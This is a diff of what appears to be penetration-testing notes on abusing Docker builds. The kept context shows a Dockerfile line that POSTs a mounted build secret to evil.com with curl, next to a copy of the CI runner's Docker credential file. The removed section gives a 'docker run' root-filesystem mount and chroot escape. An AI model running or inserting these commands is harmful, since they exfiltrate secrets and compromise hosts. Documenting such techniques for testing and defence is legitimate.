@@ -33,11 +33,3 @@ ADD /home/runner/.docker/config.json config.json
 RUN --mount=type=secret,id=<secret_name> \
     curl -X POST -d "@/run/secrets/<secret_name>" http://evil.com
 ```
-
-## `docker run`
-
-If we have control over the docker arguments, we can run command directly, see [GTFOBins](http://gtfobins.github.io/gtfobins/docker/).
-
-```sh
-docker run -v /:/mnt --rm -it alpine chroot /mnt <cmd>
-```
